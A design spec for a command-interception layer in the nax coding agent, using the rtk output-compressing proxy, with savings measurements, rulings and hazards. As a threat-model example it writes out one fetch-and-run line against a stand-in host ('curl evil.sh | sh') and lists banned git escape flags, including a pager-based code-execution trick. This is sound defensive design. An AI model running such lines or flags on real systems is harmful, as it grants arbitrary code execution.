# Command interception for the native agent, with rtk as first consumer

Design only. Status: **design approved, not yet implemented.** No code changes are to be
made against this spec while the import-cycles refactor is in flight.

**Prerequisite: `2026-09-13-nax-provider-tools-design.md`** — but only for US-006, the
recall tool. Everything else here (the interception seam, the git site, the rtk
provider, output post-processing) is independent of it and can land first.

Companion spec: `2026-09-13-nax-mcp-client-design.md`. It shares only the provider-tools
prerequisite; the two otherwise share no files and may land in either order.

## 1. Goal

Reduce the tokens that command output costs the native agent, by allowing commands to be
rewritten before execution — the motivating consumer being **rtk**
(`~/workspace/sandbox/rtk`), a CLI proxy that filters and compresses command output.

The feature nax actually gains is the **seam**, not rtk. nax has no pre-execution
interception point today; this spec adds one, and rtk is its first consumer. A design
that hardcoded rtk into the spawn sites would be smaller and worse: untestable without
rtk installed, and impossible to turn off cleanly.

Native agent only. ACP is out of scope (§8).

## 2. Current state

### 2.1 There is no bash tool

This is the finding that shapes everything. Grepping `src/` for a `Bash` tool returns
nothing. The agent **cannot author a shell string**. Reserved built-ins
(`src/tools/registry.ts:74-87`) are `Read, Glob, Grep, Write, Edit, Delete, Git,
GitCommit, RunCommand, RequestCapability, Exec`, and only two of them reach a shell:

- **`RunCommand`** (`src/tools/run-command.ts:225-363`) — the model names a *key* from
  `.nax/config.json` `quality.commands` and supplies `{{placeholder}}` values, quoted via
  `shellQuoteArg`. The template is project-authored and trusted, equivalent in trust to a
  Makefile. Executes through `runQualityCommand`.
- **`Exec`** (`src/tools/run-command-exec.ts`) — argv array, **no shell**, against an
  allowlist (`src/config/permissions.ts:112-128`), with `validateArgv` rejecting shell
  metacharacters. Its file header documents a structural no-shell guarantee enforced by a
  test that reads the file whole.

Consequence: "wrap the agent's shell calls" and "wrap the harness's quality commands" are
**largely the same seam**, because both funnel through `runQualityCommand`, discriminated
by an existing `origin: "harness" | "agent-tool"` field (`src/quality/runner.ts:46-59`).

### 2.2 No interception layer exists

| Layer | Location | Why it cannot carry this |
|---|---|---|
| Lifecycle hooks | `src/hooks/types.ts:8-21` | Run-level events (`on-start`, `on-story-start`, …). Nothing fires before a command |
| Agent middleware | `src/runtime/agent-middleware.ts` | Wraps agent *runs*, not tool calls |
| Tool policy | `src/tools/policy.ts` | Allows/denies; `src/tools/denial-redirect.ts` *suggests* alternatives. Advisory text, never a rewrite |
| `normalizeExec` | `src/tools/package-managers.ts` | The one real rewrite in the codebase — and the precedent this design copies, because it already surfaces divergence through `ToolResult.audit.executed` (`src/tools/registry.ts:20-33`) |

### 2.3 The three execution sites

| # | Site | Shape | Covers |
|---|---|---|---|
| 1 | `src/quality/runner.ts:150-165` | `/bin/sh -c` | **Every** configured quality/lint/typecheck/test command — harness-invoked *and* agent-invoked via `RunCommand`. Injectable seam `_qualityRunnerDeps.spawn` already exists |
| 2 | `src/verification/executor.ts:85-125` | `/bin/sh -c` | Acceptance and test runs |
| 3 | `src/utils/git.ts:71-91` (`gitWithTimeout`) | argv | The `Git` and `GitCommit` tools |

Site 1 was predicted to be the highest-value by a wide margin: one function covering
both the harness's own gates and the agent's only shell-reaching tool. **US-001 refuted
that prediction outright** — see R10. Sites 1 and 2 are out of scope; only site 3 is
wired. The table above is retained because it describes where commands actually leave
nax, which is still the map anyone reasoning about this feature needs.

### 2.4 What rtk offers

- **`rtk rewrite "<cmd>"`** — a real integration API with an exit-code protocol:
  `0`+stdout = rewritten, `1` = no equivalent, `2` = deny rule matched, `3`+stdout =
  rewrite but ask. This is what every other agent's PreToolUse hook consumes, and it is
  what a shell site would have had to use rather than blindly prefixing `rtk`. R10 drops
  both shell sites, so nax never calls `rtk rewrite`; recorded because it is the API any
  future reopening would start from, and because it is the reason a naive `rtk <cmd>`
  prefix is the wrong shape (see R10, reason 3).
- **`never_worse`** (`src/core/guard.rs:18-24`) — a global invariant: if the filtered
  output would estimate larger than the raw output, rtk emits the raw. rtk structurally
  cannot cost more tokens than the unwrapped command. This is the strongest safety
  property in the integration.
- **Exit codes are preserved** (`exit_code_from_status`), including `128 + signal`.
- **`rtk proxy <cmd>`** — unfiltered but tracked; the escape hatch.
- **`RTK_DISABLED=1`** — documented master kill switch for the rewrite layer.

### 2.5 The git mapping, and why it disappoints

nax's `Git` tool (`src/tools/git.ts`) is argv-only, 5 read verbs
(`diff, log, show, status, blame`), and `buildGitArgv` (`:186-266`) **always** emits
`--relative` on diff/log/show, **always** appends `--`, and appends `.` when no paths are
given.

| nax verb | rtk behaviour | Net |
|---|---|---|
| `status` | compact path requires no args, or only `-b/-s` (`git.rs:57-73`). nax always sends `--` and `.` | **Compact path can never fire.** nax cannot stop sending them — they exist to prevent git reinterpreting a non-revision as a pathspec |
| `log` + `nameOnly` | `--name-only` ∈ `requests_raw_diff_shape` → **full passthrough** | Zero gain on exactly nax#2009's case (79 KB from 7 commits, largest call in a 267-call session) |
| `log` plain | nax's `--max-count=20` reads as user-set: rtk disables its own cap, widens truncation 80→120, skips `--no-merges` | Modest |
| `diff`, `show` | `compact_diff`, 500-line cap | **The real win** |
| `blame` | no filter → passthrough | None, no harm |

This is why §6 makes measurement the first story rather than an afterthought.

**The addressable surface bounds the ceiling.** Over every `~/.nax/nax/features/*/runs/*.jsonl`
run ledger — 22,411 real tool calls, 81.6 MB of tool output:

| Tool | Calls | Total KB | Share of bytes | % at 40 KB cap |
|---|---|---|---|---|
| Read | 7,405 | 55,672 | **66.6%** | 0.5% |
| Git | 1,065 | 9,201 | 11.0% | **10.0%** |
| Grep | 4,380 | 8,793 | 10.5% | 1.3% |
| RunCommand | 5,468 | 7,721 | 9.2% | 0.4% |
| Glob | 1,124 | 1,622 | 1.9% | — |

`RunCommand` + `Git` — rtk's whole addressable surface — come to ≈20% of tool output
bytes (~14.6% once the portion already above the cap is excluded). `Read` alone is 66.6%
and rtk cannot touch it: that is nax's own in-process file read, not a command. So rtk's
ceiling is bounded well below any figure rtk's own README reports for bash output
generally, and any claim that rtk cuts nax's context cost by a large fraction is false
before measurement starts. The 40 KB cap is not usually binding (0.4% of `RunCommand`,
10% of `Git` calls), so sub-cap reduction does convert into delivered savings; `Git` is
the exception to watch.

## 3. Rulings

**R1 — The seam is generic; rtk is a consumer.** No rtk knowledge in `src/quality/`,
`src/verification/` or `src/tools/`. The interface is exercised in tests by a fake
interceptor, so nax's suite never requires rtk installed.

**R2 — Two request shapes, not one.** nax has a shell-string path and an argv path.
Collapsing them would mean shell-quoting an argv only to re-split the result — a
quoting-bug generator on a security-sensitive path.

**R3 — Fail open at rewrite time, never at execution time.** If rtk is unhealthy the
interceptor declines to rewrite. There is **no** "re-run raw on suspected rtk failure":
re-running a test suite to disambiguate an exit code is prohibitively expensive and makes
execution non-idempotent.

**One carve-out: a spawn-level failure is not an execution failure.** If the rewritten
command fails to spawn at all — rtk removed from PATH after preflight passed, permissions
changed — then *nothing ran*, so re-running raw once costs nothing and risks nothing. This
does not contradict the rule above, which is about exit codes from a command that actually
executed. The two are cleanly distinguishable: `runQualityCommand`'s catch block returns
`exitCode: -1` (`src/quality/runner.ts:254-263`), a value no real process produces. A
spawn failure also trips the circuit breaker, so the fallback happens at most once per
run.

**R4 — rtk's recovery hints are stripped.** A nax agent has no shell and no `noCompact`
field, so `[full diff: rtk git diff --no-compact]` and `[+N hidden: rtk recall <hash>]`
are instructions it cannot follow. Passing them through reproduces nax#1800's failure
mode (prompts implying a shell that does not exist) and burns turns on denials.

**R5 — The recall escape hatch is a tool contributed by the interceptor**, not a nax
built-in. Otherwise "generic seam" is fiction and nax hard-depends on rtk.

The mechanism is owned by **`2026-09-13-nax-provider-tools-design.md`**, a prerequisite
for this spec. The recall tool is a **`static`-kind** provider: its schema is authored in
nax's repo and reviewed in nax's PRs, so it carries none of the sanitization or pinning
obligations that a `discovered` provider (an MCP server) does. That distinction is the
reason the mechanism is its own spec rather than something either feature owns.

**R6 — Rewrite output is validated against nax's own escape-flag ban.** rtk accepts git
global options nax deliberately refuses (`-C`, `-c`, `--git-dir`, `--work-tree`,
`--exec-path` — `GIT_ESCAPE_FLAGS`, `src/tools/git.ts:180`; `-c` is included because
`-c core.pager=<cmd>` is code execution). A rewrite that changes cwd or introduces one of
these is rejected. nax runs stories in parallel worktrees, where targeting the wrong tree
fails silently rather than loudly.

**R7 — Opt-in.** `enabled: false` by default. Interception changes what the agent sees;
it should not switch on because a binary happens to be installed.

**R8 — Measurement decides the verb table.** `git.verbs` ships conservative and is opened
by US-001's data, not by this document's assertions. A verb enters the table only on a
saving that survives **re-sampling** — a single-sample result is not data (see US-001's
sampling note), and a verb whose measured saving is an artifact of which commit HEAD sat
on stays out.

**R9 — RETIRED by R10, retained as the record of why the shell sites are not worth it.**
R9 applied only to sites 1 and 2, the two shell-string sites. R10 drops both, so no
rewritten shell string is ever executed and none of the narrowing below is implemented.
Read this ruling as the cost side of R10's ledger: it is the security burden the feature
would have carried for a measured 0% saving. If a future measurement ever reopens a shell
site, this ruling is the precondition for doing so — it does not get re-litigated.

The original ruling follows.

**A rewritten shell string is executed; the trust boundary moves, and must be
narrowed.** This is the most security-relevant consequence of the whole design and it
deserves to be stated plainly rather than left implicit.

Today the string reaching `/bin/sh -c` at sites 1 and 2 originates in
`.nax/config.json`, which `src/verification/executor.ts` documents as **trusted —
equivalent in trust to a Makefile**. After this change, the string reaching the shell is
**another binary's stdout**. Nothing in R6 (which only bans git escape flags) would stop
a rewrite returning `bun test; curl evil.sh | sh`.

Enabling the interceptor is therefore granting the provider binary arbitrary code
execution with the harness's privileges. That may well be acceptable — the user installed
rtk deliberately — but "acceptable" and "unstated" are different things, and R7's opt-in
default is partly justified by this.

Narrowing, enforced on every rewritten shell string before it is spawned:

1. **Shell-operator skeleton must be preserved.** Split original and rewrite on the same
   operators (`&&`, `||`, `;`, `|`). The two sequences of operators must be identical.
   A rewrite may not introduce a new command boundary.
2. **Each segment must be either unchanged, or the original segment prefixed by the
   provider's own binary name.** `bun test` → `rtk bun test` passes; `bun test` →
   `something-else` does not.
3. **No new redirections.** A rewrite may not introduce `>`, `>>`, or `<` absent from the
   original.

This is a tight fit for what rtk's rewriter actually does — its documented compound
handling rewrites both sides of `&&`/`||`/`;` and leaves pipeline producers raw — so the
check costs nothing in practice and converts "trust the binary completely" into "trust
the binary to prefix commands".

An argv rewrite needs none of this: it is a static per-verb mapping built by nax (US-004),
never a string parsed back from a subprocess.

**R10 — nax does not wrap user-authored command strings. Sites 1 and 2 are dropped; the
git site is the whole feature.** (User ruling, 2026-09-13, on US-001's measured table.)

`quality.commands.*` and `acceptance.command` are authored by the user in
`.nax/config.json`. The git site is different in kind: that argv is built by nax in
`buildGitArgv`, and the user has no way to reach it.

Four reasons, in the order that decided it:

1. **On the success path the measurement found nothing to save, and the failure path is
   unresolved.** Every passing quality command in nax's own repo is byte-identical through
   rtk (`test` 312→312, `build` 200→200, `typecheck` 0→0). The failing path was probed
   twice and disagreed with itself: a failure whose output is a Bun stack trace compressed
   well (`test` 8,156→3,419, 58%), while a failure whose output is structured Biome
   diagnostics compressed not at all (`lint` 2,964→2,964, 0%). rtk's filters are
   shape-sensitive, and a gate's failure output shape is a property of the user's toolchain,
   not something nax can predict.

   So this reason is narrower than "no saving exists": it is "no saving on the path that
   always runs, and an unpredictable one on the path that sometimes does." That is not a
   sufficient basis to move a trust boundary, but it is also not the load-bearing reason.
   Reasons 2-4 are, and none of them depends on a number.

2. **The user can already do this, precisely, without us.** Anyone who wants rtk on their
   test command writes `rtk bun run test` in their own config. That path is explicit,
   visible in the file the user already maintains, and needs no nax feature. A `sites`
   flag would only add a second, less obvious way to express what the config line already
   says — and the two could disagree.

3. **Auto-prefixing a user string is fragile in a way nax cannot fix.** A command may
   carry env assignments (`AGENT=1 bun run lint:biome`), pipelines, redirections, or
   subshells. Naive prefixing turns the first of those into `rtk AGENT=1 bun …`, where rtk
   execs `AGENT=1` and exits 127 — turning a green gate red. The measurement harness hit
   exactly this bug and mis-reported it as an rtk disqualification. nax would be shipping
   a shell-syntax parser to guess where a user meant the wrapper to go; the user knows,
   and can just type it.

4. **Dropping these two sites deletes R9 entirely.** R9's operator-skeleton, segment-prefix
   and redirection checks exist solely to contain a rewritten shell string. With no shell
   site, the string reaching `/bin/sh -c` still originates in `.nax/config.json` — the
   trusted-as-a-Makefile boundary `src/verification/executor.ts` documents today — and the
   feature's most security-sensitive machinery is not built rather than built carefully.

**What this costs.** A failing gate is verbose, and that is exactly when nax re-reads it —
so the 58% stack-trace sample is a real saving this ruling declines to capture
automatically. The ruling accepts that knowingly. Reasons 2-4 do not depend on the
measurement at all: a user whose gates fail verbosely can capture the same saving with one
edit to a line they already own, and nax wrapping it for them would still be moving a trust
boundary to do automatically what the user can do explicitly. What the ruling buys in
exchange is that no user's command string is ever rewritten by a binary nax does not
control.

**Reopening.** Not on savings numbers alone — a red-build measurement showing a large
saving argues for documenting `rtk` in the config example, not for wiring a site. Reopen
only if some command string is shown to be genuinely unreachable by the user, which no
known case is.

## 4. Design

### US-001 — Measurement harness

**First story, and a gate on the rest.** Build a corpus from real data, not invented
commands:

- `quality.commands` specs from the repos nax actually runs against
- real `Git` and `RunCommand` invocations mined from existing tool-audit ledgers
  (`src/tools/tool-audit.ts`). Note these record the tool **input** (`subcommand`, `refs`,
  `paths`, …), not the executed argv, so the corpus reconstructs argv by replaying each
  recorded input through `buildGitArgv` (`src/tools/git.ts:186-266`) — which is the right
  thing anyway, since it captures the always-emitted `--relative`, `--` and `.` that §2.5
  shows are what defeat rtk's compact paths

Run each raw and through rtk, recording:

| Metric | Why |
|---|---|
| bytes before/after | the headline |
| bytes after nax's 40 000-byte slice | **the number that matters** — reducing 2 MB to 200 KB buys nothing when both get cut to 40 KB |
| **exit-code parity** | a correctness gate, not a savings metric. Any divergence disqualifies that verb outright |
| output-equivalence class | identical / reduced-but-faithful / restructured |
| wall-clock delta | rtk adds a process hop |
| SQLite contention under parallel invocation | H5 below; rtk writes tracking rows on every call and nax runs parallel worktrees |

Output is the per-verb table that populates `git.verbs`.

**Stated expectation, so the data can falsify it:** sites 1 and 2 carry nearly all the
value; `git diff` and `show` carry some; `status`, `log --name-only` and `blame` carry
none. If that holds, `git.verbs` ships `["diff","show"]`. If the measurement disagrees,
the measurement wins.

*Retained verbatim as the record of a prediction that the data reversed almost entirely.*
Sites 1 and 2 carried none of the value on the success path, `log` was the largest win
rather than a predicted zero, and `show` — the one verb the prediction was confident
about — is the only verb disqualified outright. The measurement won.

Measured result — **run 4**, 2026-09-13, repo root at `230f25551`, rtk 0.45.0,
12-commit sample, via `scripts/analyze-rtk-savings.ts`. Full write-up, including the two
superseded runs and the defects they exposed, in
`docs/superpowers/results/2026-09-13-rtk-savings-measurement.md`.

```
verb	n	rawKB	rtkKB	saved%	delivered-saved%	median%	min%	max%	verdict
show	24	1042	257	75.4	41.9	52.9	0.0	99.6	DISQUALIFIED — exit-code divergence on 12/24
diff	14	951	286	70.0	27.9	21.6	-7.3	53.3	ok
log	3	139	9	93.2	85.0	84.6	0.0	91.7	ok
blame	1	23	23	0.0	0.0	0.0	0.0	0.0	ok
coverage	1	4	4	-0.4	-0.4	-0.4	-0.4	-0.4	ok
lint	2	1	1	0.0	0.0	0.0	0.0	0.0	ok
status	1	1	0	47.1	47.1	47.1	47.1	47.1	ok
test	1	0	0	0.0	0.0	0.0	0.0	0.0	ok
build	1	0	0	0.0	0.0	0.0	0.0	0.0	ok
typecheck	2	0	0	0.0	0.0	0.0	0.0	0.0	ok

NOT MEASURED (absent from the table above, not a measured zero):
  testScoped	placeholder template, not executable as written
  lintFix	mutating: would write to the working tree
  formatFix	mutating: would write to the working tree
```

**The git half.** `log` is the headliner: 93.2% raw, 85.0% *delivered* after nax's 40 KB
slice — §2.5's "full passthrough, zero gain" conjecture is wrong. `diff` is a real but
smaller win at 27.9% delivered (median 21.6%) across 14 commits. `blame` is byte-identical (rtk passes it
through), and `status`'s 44% is 44% of 100 bytes. `show` saves as much as `diff` and is
still excluded: `rtk git show <ref> --name-only` exits 128 where raw git exits 0, on all
12 sampled commits. Parity is a correctness gate — nax derives `success` from that code.

**Sampling is load-bearing, and this is the methodological finding of US-001.** `diff-ref`
and `show` measure one commit, so they measure whatever that commit contained. Run 1 sat
on a docs commit (8.6 KB) and scored `diff` at 1.8% delivered; run 2 sat on a feature merge
(76.8 KB) and scored the same verb at 37.5% delivered (67.4% raw). Neither number was
about rtk. Only the
12-commit sample above (27.9%, median 21.6%) is evidence, and R8 now requires re-sampling before any
verb enters the table. `log`, whose output does not depend on HEAD position, scored 93.5%
and 93.2% across two independent runs — which is what a stable measurement looks like.

**The shell half on the success path: no saving exists.** Every passing quality command is
byte-identical through rtk (`test` 312→312, `build` 200→200, `typecheck` 0→0). `coverage`
measures slightly *larger* through rtk, but its raw output is not byte-stable run to run
(4,161 / 4,324 / 4,342 bytes across three runs, because it prints timings), so read its
−3.9%/−8.4% as noise around zero rather than as a regression. For the failure path, which
is a different and unsettled story, see R10 reason 1. Two earlier caveats are now closed
rather than open:

- The run-1 `lint` DISQUALIFICATION (rtk 127) was a harness defect, not an rtk property —
  the wrapper emitted `rtk AGENT=1 bun run lint:biome`, so rtk tried to exec `AGENT=1`.
  Fixed by `injectRtk`, which places `rtk` after leading assignments. `lint` now measures
  at parity and 0.0% saving. The defect is preserved as R10's reason 3: naive prefixing of
  a user's command string is wrong, and nax should not be in the business of guessing.
- Runs 1 and 2 executed `lintFix` and `formatFix` — mutating commands the plan's own
  constraints forbid — four times each. Fixed by `isMutatingQualityCommand`.

**The limit of this evidence, stated so it is not overread.** The shell-half rows measure
the **success path only**: nax's quality commands route through `scripts/quiet-run.ts`,
which prints one `OK:` line when `AGENT=1` and the command passes. A *failing* gate is
verbose, and that is when nax re-reads it. R10 does not rest on this row alone — see its
reasons 2-4, which hold regardless of what a red build would measure.

**Acceptance:** the harness runs without rtk installed (skipping, not failing); a verb
with any exit-code divergence is reported as disqualified; the report distinguishes
pre-slice from post-slice savings.

### US-002 — The `CommandInterceptor` interface

New `src/execution/command-interceptor.ts` (location subject to the import-cycle rules in
force at implementation time).

```
type InterceptRequest =
  | { kind: "shell"; command: string; cwd: string; site: Site }
  | { kind: "argv";  argv: readonly string[]; cwd: string; site: Site }

type InterceptResult =
  | { kind: "unchanged" }
  | { kind: "rewritten"; command?: string; argv?: readonly string[]; provider: string }
  | { kind: "declined"; reason: string }

type Site = "quality" | "verification" | "git"

interface CommandInterceptor {
  readonly provider: string
  intercept(req: InterceptRequest): Promise<InterceptResult>
  // Consulted ONLY for output of a command this interceptor rewrote.
  postProcess?(output: string, req: InterceptRequest): { output: string; notes?: Record<string, string> }
}
```

**`postProcess` exists because US-005 otherwise has no home.** Stripping rtk's hint
strings is provider-specific knowledge; without this hook that logic would have to live
in `src/quality/` or `src/tools/`, violating R1 outright. The call sites invoke it
blindly, know nothing of what it does, and skip it entirely for a command that was not
rewritten. `notes` is how the recall hash travels out-of-band to US-006 without the call
site understanding it.

A rewritten result must match the request's shape. Validation per R6 and R9 runs on every
rewritten result before it reaches a spawn.

**Acceptance:** a fake interceptor returning `unchanged` leaves every call site
byte-identical to today **and is never asked to post-process**; a fake returning a shape
mismatch is rejected; a fake introducing `-C` is rejected; a fake whose `postProcess`
throws degrades to the raw output rather than failing the command.

### US-003 — Wiring the git site

Per R10 there is **one** site, not three.

- **The site is `src/tools/git.ts:319`**, the `Git` tool's own call into
  `gitWithTimeout` — argv shape, gated by `git.verbs`.

  ⚠️ **Not `gitWithTimeout` itself.** Earlier revisions of this spec named
  `src/utils/git.ts:71` and claimed it "covers the `Git` and `GitCommit` tools." That was
  wrong, and dangerously so: `gitWithTimeout` has **52 callers**, and at least nine issue
  `log`/`diff` and then machine-parse the stdout — `verification/smart-runner.ts:484,550`
  (filenames → which tests to run), `verification/changed-line-ranges.ts:44` (unified
  hunks), `verification/flake-baseline-diff.ts:54`, `review/runner/index.ts:207`,
  `worktree/merge.ts:366` (conflict detection), `finish/review/audit-gaps.ts:88`,
  `utils/git.ts:221`, `context/engine/providers/git-history.ts:73`.

  rtk's purpose is to compact output. Compacting a `--name-only` list that nax then splits
  into filenames is not a token saving — it is scoped test selection running the wrong
  tests and merge-conflict detection missing files, silently. Intercepting at
  `gitWithTimeout` would do exactly that.

  Nothing is lost by narrowing: those internal outputs never reach a model, so there were
  no tokens to save there. **Only the `Git` tool's output is agent-facing, and it is the
  only thing this feature may touch.**

Sites 1 (`src/quality/runner.ts`) and 2 (`src/verification/executor.ts`) are **out of
scope and must not be touched.** A change to either is a spec violation, not an
improvement: both take user-authored strings, both measured no saving, and wiring either
one re-introduces R9. `RunCommand` is therefore *not* covered by this feature — it reaches
the shell through site 1.

`GitCommit` is excluded: US-001 measured no read-verb benefit that would justify it, and
rtk's `run_commit` inherits stdin for editor/GPG/credential-helper prompts, which
interacts badly with nax's timeouts.

**Acceptance:** with the interceptor disabled, `gitWithTimeout` produces byte-identical
behaviour to today, proven by tests that do not reference rtk; with a fake interceptor
that rewrites, the exit code nax observes is the rewritten command's exit code unchanged,
including a non-zero one — a rewrite must never turn a failing call into a passing one, or
the reverse. A test asserts that no interception seam exists in `src/quality/runner.ts` or
`src/verification/executor.ts`, so a later change cannot quietly re-add one.

### US-004 — The rtk provider

New `src/execution/interceptors/rtk.ts`, the only file that knows rtk exists.

- **shell requests** → `rtk rewrite "<command>"`, mapping the exit-code protocol:
  `0` → rewritten · `1` → unchanged · `2` → unchanged (rtk's deny rules govern rtk, not
  nax; nax's own policy layer is the authority on what may run) · `3` → **unchanged**.
  Exit 3 means "rewrite but prompt a human"; nax has no interactive prompt at this layer,
  so the safe reading is to decline the rewrite.
- **argv requests** → a static per-verb mapping (`["git", …]` → `["rtk","git",…]`) for
  verbs in `git.verbs`, never via `rtk rewrite`, which returns a string and would require
  re-splitting.
- **Preflight**: one `rtk --version` per run gates all rewriting and records the version
  into run artifacts (H6).
- **Circuit breaker**: after `failuresBeforeDisable` interception failures, rtk is
  disabled for the remainder of the run.

**Acceptance:** each of the four exit codes maps as specified; a missing rtk binary yields
`declined` on every request and never throws; the circuit breaker latches.

### US-005 — Output post-processing

Applied to output from a rewritten command:

1. **Strip rtk's recovery hints** (R4) — `[full diff: …]`, `[+N hidden: rtk recall …]`,
   `[full output: rtk recall …]`.
2. **Append nax's own truncation marker.** `RunCommand` currently ends with
   `body.slice(0, ctx.maxBytes)` and **no marker** (`src/tools/run-command.ts:360`),
   unlike `Git`, `Read` and `Grep`, which all append `... [truncated at N bytes]`. Since
   output is already being post-processed, this spec closes that asymmetry so the agent
   can distinguish elision from completion.

   Note while touching this line: `String.slice` counts **characters**, but `maxBytes` is
   a byte budget and the other tools truncate by bytes. `GitCommit` has the same
   character/byte mismatch (`src/tools/git-commit.ts:68`). Neither is this spec's bug to
   fix, and widening the change risks entangling it with the refactor — but a marker that
   claims "truncated at 40000 bytes" after a 40 000-*character* cut would be actively
   wrong, so the marker and the cut must at least agree with each other.
3. **Preserve the recall hash** out-of-band via `postProcess`'s `notes`, and **re-expose
   it through nax's own marker**.

**Closing the loop — the part that is easy to get wrong.** Stripping the hint (R4) and
carrying the hash out-of-band would leave the agent with no way to know a recall is even
possible, making US-006's tool unreachable. So the two halves must be connected: nax's
marker names a tool the agent actually has, rather than a shell command it does not.

```
... [truncated at 40000 bytes; full output available via Recall(id: "3f9c2a81d4e7")]
```

The distinction from rtk's own hint is the whole point of R4. `rtk recall 3f9c2a81d4e7`
asks the agent to run a shell command it cannot express — nax#1800's failure mode.
`Recall(id: …)` names a tool in its advertised list. Same hash, same capability, one of
them actionable.

Consequence for sequencing: when the recall tool is **not** advertised — US-006 not yet
landed, provider ungranted, or the stage not attached — the marker must **not** name it.
It degrades to a plain truncation notice. Offering a tool the agent does not have is worse
than offering nothing, because it burns a turn on a denial to discover that.

**Acceptance:** no rtk hint string survives into a tool result; a truncated `RunCommand`
result carries a marker; a non-truncated one does not; the marker names `Recall` only when
that tool is advertised for this hop, and omits it otherwise.

### US-006 — The recall tool

An interceptor-contributed tool (R5) exposing `rtk recall <hash>`, so the escape hatch is
expressible rather than a dead end. Gated by config and by the policy layer like any other
tool.

Implemented as a **`static`-kind `ToolProvider`** per the provider-tools spec — nax
authors the schema, so no sanitization and no pinning. That spec is a hard prerequisite
for this story and only this story: US-001 through US-005 do not depend on it.

The recall hash reaches this tool through `postProcess`'s `notes` (US-002), never by the
agent reading it out of command output — the hint strings carrying it are stripped before
the agent sees them (R4).

**Acceptance:** a hash from a stripped hint can be retrieved through the tool; an
ungranted call is denied like any other tool; with the interceptor disabled the tool is
not advertised **and no marker offers it** (US-005).

### US-007 — Config

```json
{
  "execution": {
    "commandInterceptor": {
      "provider": "rtk",
      "enabled": false,
      "git": { "verbs": ["log", "diff"] },
      "failuresBeforeDisable": 3
    }
  }
}
```

One interceptor, not a list — a second provider can widen the schema when one exists.
`.strict()`, mounted in the existing `execution` block, documented in
`src/cli/config-descriptions.ts`.

**There is no `sites` key.** Earlier drafts carried one because there were three sites to
select among; R10 leaves a single site, so `enabled` is the on/off and `git.verbs` is the
only scope knob. A `sites` key would now be a field with one legal value.

`git.verbs` carries **measured** values (US-001 run 4, 2026-09-13, 12-commit sample,
recorded in `docs/superpowers/results/2026-09-13-rtk-savings-measurement.md`). Two verbs
cleared the bar:

| verb | n | delivered saving | in `verbs` |
|---|---|---|---|
| `log` | 3 | **85.0%** | yes |
| `diff` | 14 | **27.9%** (median 21.6%, range −7.3% to 53.3%) | yes |
| `status` | 1 | 47.1% of ~1 KB | **no** — a percentage of nothing |
| `blame` | 1 | 0.0% | **no** — rtk passes it through byte-identical |
| `show` | 24 | 41.9% | **no** — DISQUALIFIED on exit-code divergence |

An earlier revision listed `["log", "diff", "status", "blame"]`. That list did not follow
from its own table — it included `blame` at a measured 0.0% and `diff` at a measured 1.8%
— and both of its `diff`/`show` figures came from a **single-commit sample**, which R8 now
forbids. Treat any verb table in this spec as provisional unless it cites the results
doc.

`show` is excluded even though it saves as much as `diff`: `rtk git show HEAD --name-only`
returns `fatal: options '--name-only', '--name-status', '--check', and '-s' cannot be used
together` and exits 128 where raw git exits 0. Exit-code parity is a correctness gate, not
a savings metric — nax computes `success` from that code. Note this is the same
`show --name-only` shape as open issues #2011 and #1800.

**Acceptance:** default config leaves behaviour unchanged; an unknown key fails with
`CONFIG_SCHEMA_INVALID`; an empty `git.verbs` intercepts nothing and is not an error; a
verb absent from `git.verbs` is never intercepted; `enabled: false` disables interception
without requiring `git.verbs` to be empty.

### US-008 — Audit and replay

Every rewrite records **requested vs executed**, following the `audit.executed` precedent
(`src/tools/registry.ts:20-33`), so the tool ledger and `src/replay` stay faithful. A
replay of a run that used rtk must reproduce what actually executed, not what was asked
for.

Preflight records the rtk version; the circuit breaker records the trip and its cause.

**Acceptance:** a ledger row for a rewritten command carries both forms; a run with a
tripped breaker says so in its artifacts.

## 5. Hazards

| # | Hazard | Mitigation |
|---|---|---|
| H1 | **Exit-code ambiguity.** rtk's internal errors exit `1`, identical to a legitimately failing lint. nax computes `success: exitCode === 0`, so an rtk crash reads as a quality-gate failure and triggers a fix cycle against a non-existent defect | R3 preflight + circuit breaker. The `rtk:`-prefixed stderr signature is used to *report* distinctly, never to retry |
| H2 | **Dead-end recovery hints** → nax#1800's failure mode | R4 strip + US-006 recall tool |
| H3 | **Working-root integrity** in parallel worktrees | R6 escape-flag ban + cwd invariance on every rewrite. Observed concretely: an rtk-rewritten `git` command was refused by a worktree-isolated session because its target root could not be verified |
| H4 | **Truncation interaction** | `never_worse` bounds the downside; US-005 adds the missing marker |
| H5 | **SQLite tracking contention** under parallel stories. Unmeasured | Measured in US-001; `RTK_DATA_DIR` per run is the lever if it bites |
| H6 | **Version skew** — rtk behaviour is version-dependent | Preflight records the version into run artifacts, so telemetry cannot silently straddle a behaviour change |
| H7 | **stdin.** rtk's filtered modes default stdin to null; `rtk proxy` does not wire it at all | The read verbs in `git.verbs` never use stdin. `GitCommit`, which does, is excluded by US-003 |
| H8 | ~~**Provider stdout is executed as shell**~~ — **cannot occur.** R10 drops both shell sites, so no provider output ever reaches `/bin/sh -c` | Structural: the code is not written. R9 records the narrowing that *would* have been required |

**Checked and found to be a non-issue:** rtk's filtered mode merges the child's stdout and
stderr before filtering, which looked like it would change what nax sees. It does not —
`runQualityCommand` already merges them itself: `const output = [stdout, stderr]
.filter(Boolean).join("\n")` (`src/quality/runner.ts:241`). The two behaviours agree, and
rtk's own `rtk:`-prefixed internal errors still land in that merged stream where H1's
detection can read them. Recorded so this is not re-raised as a blocker later.

## 6. Sequence

US-001 (measurement) has run; its outcome is R10, which cut the feature to the git site
and fixed `git.verbs`. What remains is a chain: US-002 (interface) → US-003 (git site) →
US-004 (provider), with US-007 (config) alongside US-002. US-005 depends on US-004. US-006
depends on US-005 and on the shared externally-provided-tools mechanism (R5), which has
since shipped (nax#2031). US-008 lands with US-003.

The first end-to-end verifiable slice is US-004 against the git site — which is now the
only site, so it is also the last.

## 7. Verification

Everything except US-001 and US-004 is testable with a fake interceptor and no rtk
installed. US-004 needs rtk on PATH and is skipped otherwise — it must not turn a missing
optional binary into a red suite.

The claim this spec is ultimately making is a token-savings claim, and it is **not**
proven by unit tests. Before the feature is declared worthwhile, run the same story with
`enabled: false` and `enabled: true` and compare cost-ledger spend and turn counts. rtk's
own percentages measure bash output, not billed tokens, and rtk ships no tokenizer — its
`src/core/tracking.rs` estimates tokens as `bytes / 4`, so its reported ratios are
reliable but its absolute counts are approximate. nax's cost ledger is the authority.

## 8. Out of scope

- **ACP.** The whole design is native-only by construction: the git site, US-005 and
  US-006 are tool-facing, and coding tools never reach the ACP adapter. No ACP-specific
  guard is added. (The harness-side shell sites that would have been shared are dropped
  by R10.)
